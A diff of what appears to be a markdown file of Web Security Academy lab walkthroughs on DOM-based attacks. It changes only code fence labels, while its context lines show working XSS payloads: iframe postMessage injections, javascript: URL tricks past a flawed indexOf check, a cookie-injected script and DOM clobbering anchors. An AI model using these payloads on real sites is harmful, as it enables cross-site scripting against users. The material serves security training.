@@ -8,7 +8,7 @@
 
 1. The home page contains an `addEventListener()` call that listens for a web message. 
 
-```html
+```text
 <script>
     window.addEventListener('message', function(e) {
         document.getElementById('ads').innerHTML = e.data;
@@ -18,7 +18,7 @@
 
 2. Create payload:
 
-```html
+```text
 <iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 ```
 
@@ -45,7 +45,7 @@ An attacker needs to use the exploit server to post a message to the target site
 1. Note the home page contains an `addEventListener()` call that listens for a web message. The JavaScript contains a flawed `indexOf()` check that looks for the strings `http:` or `https:` anywhere within the web message. It also contains the sink `location.href`.
 2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `lab-id`:
 
-```html
+```text
 <iframe src="https://lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 ```
     
@@ -72,7 +72,7 @@ To solve this lab, an attacker needs to construct an HTML page on the exploit se
 1. Note the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using `JSON.parse()`. In the JavaScript, we can see that the event listener expects a type property and that the `load-channel` case of the `switch` statement changes the `iframe` `src` attribute.
 2. Go to the exploit server and add the following `iframe` to the body field, remembering to replace `lab-id`:
 
-```html
+```text
 <iframe src=https://lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
 
@@ -131,7 +131,7 @@ To solve this lab, an attacker needs to exploit this vulnerability and redirect 
 1. Notice that the home page uses a client-side cookie called lastViewedProduct, whose value is the URL of the last product page that the user visited.
 2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your `lab-id`:
 
-```html
+```text
 <iframe src="https://lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
 ```
 
@@ -155,7 +155,7 @@ To solve this lab, an attacker needs to inject a cookie that will cause XSS on a
 
 1. Go to one of the blog posts and create a comment containing the following anchors:
 
-```html
+```text
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
 ```
 
@@ -191,13 +191,13 @@ To solve this lab, an attacker will need to construct an HTML injection that clo
 
 1. Go to one of the blog posts and create a comment containing the following HTML:
 
-```html
+```text
 <form id=x tabindex=0 onfocus=print()><input id=attributes>
 ```
     
 2. Go to the exploit server and add the following iframe to the body - Change the URL to contain your `lab-id` and make sure that the `postId` parameter matches the `postId` of the blog post into which you injected the HTML in the previous step:
 
-```html
+```text
 <iframe src=https://lab-id.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
 ```
 
